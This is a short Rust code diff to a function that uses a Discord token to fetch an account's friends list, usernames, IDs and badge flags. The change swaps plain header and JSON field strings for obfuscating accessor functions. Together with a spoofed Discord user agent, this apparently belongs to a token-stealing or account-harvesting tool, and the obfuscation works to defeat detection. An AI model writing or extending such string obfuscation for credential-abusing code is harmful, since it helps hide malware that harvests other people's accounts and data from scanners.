@@ -156,7 +156,7 @@ pub async fn fetch_discord_friends(client: &reqwest::Client, token: &str) -> Vec
     let res = match client
         .get(&url)
         .header(s_auth_header(), token)
-        .header("User-Agent", s_discord_ua())
+        .header(s_discord_ua_header(), s_discord_ua())
         .send()
         .await
     {
@@ -179,14 +179,14 @@ pub async fn fetch_discord_friends(client: &reqwest::Client, token: &str) -> Vec
     };
     let mut friends = Vec::new();
     for entry in arr {
-        let rel_type = entry["type"].as_i64().unwrap_or(0) as i32;
+        let rel_type = entry[s_discord_field_type()].as_i64().unwrap_or(0) as i32;
         if rel_type != 1 {
             continue;
         }
-        let user = &entry["user"];
-        let username = user["username"].as_str().unwrap_or("?").to_string();
-        let id = user["id"].as_str().unwrap_or("?").to_string();
-        let public_flags = user["public_flags"].as_u64().unwrap_or(0);
+        let user = &entry[s_discord_field_user()];
+        let username = user[s_discord_field_username()].as_str().unwrap_or("?").to_string();
+        let id = user[s_discord_field_id()].as_str().unwrap_or("?").to_string();
+        let public_flags = user[s_discord_field_public_flags()].as_u64().unwrap_or(0);
         friends.push(DiscordFriend {
             username,
             id,
